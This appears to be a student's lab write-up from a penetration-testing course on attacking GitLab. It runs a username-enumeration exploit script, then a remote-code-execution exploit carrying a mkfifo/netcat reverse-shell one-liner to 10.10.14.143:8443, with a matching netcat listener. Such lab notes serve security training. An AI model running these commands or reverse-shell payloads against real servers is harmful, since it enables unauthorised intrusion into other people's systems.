# [Attacking GitLab](Attacking%20GitLab.md)
### Find another valid user on the target GitLab instance.

```shell
./49821.sh --url http://gitlab.inlanefreight.local:8081 --userlist /opt/useful/seclists/Usernames/cirt-default-usernames.txt | grep exists
```
![](Screenshot%202026-08-02%20at%2011.08.38.png)
### Gain remote code execution on the GitLab instance. Submit the flag in the directory you land in.

Before execute the command below, make sure you initiate the netcat listener on your port that you just set
```shell
python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.143 8443 >/tmp/f '
```
![](Screenshot%202026-08-02%20at%2011.14.53.png)

```shell
nc -lvnp 8443
```
![](Screenshot%202026-08-02%20at%2011.15.22.png)